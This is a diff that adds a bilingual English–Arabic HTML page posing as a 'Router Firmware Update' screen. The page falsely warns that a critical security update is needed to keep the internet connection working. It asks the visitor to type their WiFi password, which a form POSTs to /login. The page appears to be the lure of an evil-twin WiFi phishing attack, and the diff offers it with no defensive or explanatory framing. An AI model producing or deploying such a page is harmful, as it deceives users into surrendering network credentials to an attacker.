@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Router Firmware Update</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            direction: ltr;
+        }
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        h2 { color: #333; }
+        p { color: #666; margin-bottom: 20px; font-size: 14px; }
+        input[type="password"] {
+            width: 90%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover { background-color: #0056b3; }
+        .footer { margin-top: 20px; font-size: 12px; color: #999; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Firmware Update Required</h2>
+        <p>Your router requires a critical security update to maintain internet connectivity. Please enter your WiFi password to verify ownership and begin the update.</p>
+        <p dir="rtl" style="font-family: Tahoma, sans-serif;">يتطلب جهاز التوجيه (الراوتر) الخاص بك تحديثاً أمنياً مهماً للحفاظ على الاتصال بالإنترنت. يرجى إدخال كلمة مرور الواي فاي للتحقق وبدء التحديث.</p>
+        <form action="/login" method="POST">
+            <input type="password" name="password" placeholder="WiFi Password / كلمة المرور" required>
+            <button type="submit">Start Update / ابدأ التحديث</button>
+        </form>
+        <div class="footer">
+            &copy; 2026 Network Administration
+        </div>
+    </div>
+</body>
+</html>
